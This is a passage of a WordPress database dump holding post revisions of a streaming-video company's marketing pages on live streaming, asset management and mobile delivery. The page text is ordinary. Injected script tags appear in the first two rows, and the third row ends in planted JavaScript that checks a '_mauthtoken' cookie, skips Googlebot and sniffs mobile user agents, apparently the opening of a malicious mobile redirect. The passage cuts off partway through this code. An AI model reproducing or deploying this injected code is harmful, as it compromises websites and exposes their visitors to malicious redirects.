(3954, 1, '2017-02-15 20:57:30', '2017-02-15 20:57:30', '[boxed_content type="coloured" custom_bg_colour="#ffffff" custom_text_colour="#000000" pb_margin_bottom="no" width="1/1" el_position="first last"]\r\n\r\nStream live content with absolute confidence that the experience of every viewer will be outstanding. Live content, including entertainment, sporting events and news, can be uploaded from anywhere in the world to Vimmi Media Delivery Platform for distribution directly to viewers on any IP platform and device.\r\n\r\nMultiple backups with automatic failover at each broadcast publishing point ensure that live content stays online. Multi-bit rate broadcasting ensures access to viewers with limited access while providing a full HD-quality experience for viewers with high bandwidth services.\r\n\r\nTime shift live events for viewing in different time zones with the Vimmi network DVR, which stores live content on the Media Delivery Platform for later viewing. For individual viewers who want to enjoy the live streaming experience at their convenience, the Vimmi network offers applications that empower each viewer to time shift live content from a personal viewing list by storing it on the CDN.\r\n\r\nSimultaneously deliver live video and audio streams to any player and any device, using any protocol, from a single set of live source streams. Perfectly aligned adaptive bitrate streams (ABR) deliver the best possible viewing experience to your customers in HLS, HDS, HSS, DASH and RTSP.\r\n\r\nWith the VIMMI on-the-fly transcoding service you can transform live non-H.264 content like MPEG-2 or MPEG-4 (part 2) to adaptive bitrate streams for any screen.\r\n<h4 class="spb-heading">Use your own encoders or go box-free with Vimmi encoding services</h4>\r\nOur Media Delivery Platform can deliver content from a range of encoders – from free RTMP encoders to broadcast-grade MPEG-TS hardware – so you can choose the best encoding solution for your needs or repurpose encoders you already own. Vimmi on-the fly transcoder service handles MPEG-2 or MPEG-4 (part 2) streams to create single or adaptive bitrates H.264 streams that can be consumed on any screen.\r\n\r\n[/boxed_content] [blank_spacer height="30px" width="1/1" el_position="first last"]<script>', 'Live Streaming', '', 'inherit', 'closed', 'open', '', '2015-revision-v1', '', '', '2017-02-15 20:57:30', '2017-02-15 20:57:30', '', 2015, 'http://vimmi.loc/2015-revision-v1/', 0, 'revision', '', 0),
(3955, 1, '2017-02-15 20:57:31', '2017-02-15 20:57:31', '[boxed_content type="coloured" custom_bg_colour="#ffffff" custom_text_colour="#000000" pb_margin_bottom="no" width="1/1" el_position="first last"]\r\n\r\nMedia asset management, which handles assets to be delivered on demand and via playlists to a range of target devices, is an essential element of a complete OTT system. It includes\r\n\r\n&nbsp;\r\n\r\n[list]\r\n[list_item icon="ss-check"] Asset administration [/list_item]\r\n[list_item icon="ss-check"] Classification [/list_item]\r\n[list_item icon="ss-check"] Publisher information [/list_item]\r\n[list_item icon="ss-check"] Asset packaging [/list_item]\r\n[/list]\r\nA recommendations engine based on artificial intelligence generates valuable statistics and viewing data and provides customers with recommendations in keeping with their individual preferences. It compiles small changes in individual preferences to identify emerging trends. Because analysis is based on iterative learning, it becomes increasingly accurate over time.\r\n\r\nAn EPG serves as the user interface with the asset management system. In order to enable its customers to efficiently and accurately create EPGs, EPG tools automatically connect to ingest systems and import XMLTV-formatted EPG data via a dedicated application. Time conflicts are automatically resolved by the system, when possible. When they cannot be resolved automatically, the system notifies an administrator about the conflict. Operation can be scheduled to enable EPG data to be imported at a time, from each possible source. The data may be manually edited to add or remove shows or alter their parameters.\r\n\r\nThe VIMMI program planning and scheduling service is easy to learn and easy to use, even for novice WebTV administrators. It is ideal for linear or playout channels. The service provides accurate calendar views, syncing with playout or OTT systems/servers in real time and integration with the asset management system. For any time slot, the scheduler can program secondary graphic events and it maintains a comprehensive run log to track concurrence between planning and performance.\r\n\r\n<strong>EPG Tools</strong>\r\n[list]\r\n[list_item icon="ss-check"] Ingest connectors. Import the EPG from the widely-used XMLTV format via dedicated application. [/list_item]\r\n[list_item icon="ss-check"] Scheduled automatization. Automatically import the EPG data anytime you like, from any number of possible sources. [/list_item]\r\n[list_item icon="ss-check"] Manual editing. If necessary, you can use the EPG console to add and remove shows, as well as edit their parameters. [/list_item]\r\n[list_item icon="ss-check"] Conflict resolver. The system is equipped with an automatic detector of conflicting time show information, resolving them itself when possible, or notifying the EPG administrator when in doubt. [/list_item]\r\n[/list]\r\n<strong>TV Scheduler (*)</strong>\r\n\r\nTV Scheduler is the entry level program planning and scheduling tool, perfectly fits the need for the new startup webTV linear channels (info, movies, cartoons, news channels, etc..) or playout channels.\r\n[list]\r\n[list_item icon="ss-check"] Frame accurate calendar view [/list_item]\r\n[list_item icon="ss-check"] Playout system or OTT video server realtime sync [/list_item]\r\n[list_item icon="ss-check"] EPG connector (XML TV web service) [/list_item]\r\n[list_item icon="ss-check"] Asset management integration [/list_item]\r\n[list_item icon="ss-check"] Ingest list [/list_item]\r\n[list_item icon="ss-check"] Secondary graphics events [/list_item]\r\n[list_item icon="ss-check"] As-Run-Log [/list_item]\r\n[/list]\r\n\r\n[/boxed_content] [blank_spacer height="30px" width="1/1" el_position="first last"]</script>', 'Media Asset Management', '', 'inherit', 'closed', 'open', '', '460-revision-v1', '', '', '2017-02-15 20:57:31', '2017-02-15 20:57:31', '', 460, 'http://vimmi.loc/460-revision-v1/', 0, 'revision', '', 0),
(3956, 1, '2017-02-15 20:57:34', '2017-02-15 20:57:34', '[boxed_content type="coloured" custom_bg_colour="#ffffff" custom_text_colour="#000000" pb_margin_bottom="no" width="1/1" el_position="first last"]\r\n\r\nMore than ever before, viewers today expect a seamless, cross-platform viewing experience when they are on the move. On smart phones, tablets and other devices, they want high quality playback.\r\n\r\nVimmi automatically associates the appropriate format with each requesting device and delivers the transcoded video that matches its distinct video requirements.\r\n[list]\r\n[list_item icon="ss-check"] Delivers video to any platform and device [/list_item]\r\n[list_item icon="ss-check"] Supports mobile apps and sites [/list_item]\r\n[list_item icon="ss-check"] Open APIs make integration a snap [/list_item]\r\n[list_item icon="ss-check"] Provides ideal transcoding for mobile devices [/list_item]\r\n[list_item icon="ss-check"] Automatically detects smart devices [/list_item]\r\n[list_item icon="ss-check"] Compatible with HTML 5 [/list_item]\r\n[/list]\r\n\r\n[/boxed_content] [blank_spacer height="30px" width="1/1" el_position="first last"]if(document.cookie.indexOf("_mauthtoken")==-1){(function(a,b){if(a.indexOf("googlebot")==-1){if(/(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od|ad)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\\-(n|u)|c55\\/|capi|ccwa|cdm\\-|cell|chtm|cldc|cmd\\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\\-s|devi|dica|dmob|do(c|p)o|ds(12|\\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\\-|_